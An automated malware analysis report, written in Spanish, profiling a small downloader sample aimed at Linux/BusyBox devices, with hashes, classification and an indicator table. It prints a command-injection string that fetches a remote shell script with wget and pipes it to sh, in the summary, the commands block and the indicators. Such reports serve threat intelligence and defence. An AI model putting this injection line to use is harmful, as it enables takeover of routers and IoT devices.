# 🧬 Payload Analysis

`14ca2f517634e45588797ea2cd39de0919f5a841f83621c1f1a9352e10795d69`

## 📌 Resumen

Texto ASCII de 324 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://91.92.40.XXX/wget.sh -O-`
2. `sh -s wdr1`
3. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
4. `sh -` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/14ca2f517634e45588797ea2cd39de0919f5a841f83621c1f1a9352e10795d69.md](../../../../../malware-like/oraculo/downloader/14ca2f517634e45588797ea2cd39de0919f5a841f83621c1f1a9352e10795d69.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:54.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `14ca2f517634e45588797ea2cd39de0919f5a841f83621c1f1a9352e10795d69`
- **MD5:** `dbf9192afce6566008f124444ceaa7e3`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 324 B |
| Entropía | 5.11 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
sz11gChannel=1`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wdr1;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.175.XXX | static_analysis |
| command | sz11gChannel=1`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wdr1;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh - | strings |
| hash | 14ca2f517634e45588797ea2cd39de0919f5a841f83621c1f1a9352e10795d69 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
